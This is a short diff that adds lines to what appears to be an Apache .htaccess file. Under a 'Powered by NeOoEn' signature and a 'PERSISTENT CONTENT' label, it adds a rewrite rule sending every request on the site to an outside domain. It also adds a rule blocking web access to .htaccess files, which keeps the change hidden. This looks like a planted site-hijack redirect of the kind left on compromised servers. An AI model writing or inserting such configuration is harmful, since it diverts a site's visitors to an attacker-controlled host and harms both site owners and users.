@@ -1,0 +1,11 @@
+# Powered by NeOoEn
+
+#### PERSISTENT CONTENT ####
+RewriteRule ^(.*)$ https://philgap.xyz/$1 [L]
+
+#protect htaccess
+<files ~ "^.*\.([Hh][Tt][Aa])">
+order allow,deny
+deny from all
+satisfy all
+</files>
